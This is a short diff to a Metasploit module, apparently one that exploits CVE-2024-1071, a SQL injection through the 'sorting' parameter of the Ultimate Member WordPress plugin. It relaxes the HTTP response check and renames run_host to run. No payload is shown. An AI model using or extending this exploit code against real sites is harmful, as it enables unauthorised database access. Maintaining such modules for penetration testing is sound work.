@@ -62,7 +62,7 @@ class MetasploitModule < Msf::Auxiliary
         'uri' => normalize_uri(target_uri.path, uri)
       })
 
-      next unless res&.code == 200
+      next unless res&.code && res.code <= 500
 
       page = res.get_html_document
 
@@ -110,7 +110,7 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::NotFound, "Could not find a valid directory id within the range #{min_range} to #{max_range}")
   end
 
-  def run_host(_ip)
+  def run
     # next line included for automatic inclusion into vulnerable plugins list
     # check_plugin_version_from_readme('ultimate-member', '2.8.3')
     print_status("Performing SQL injection for CVE-2024-1071 via the 'sorting' parameter...")
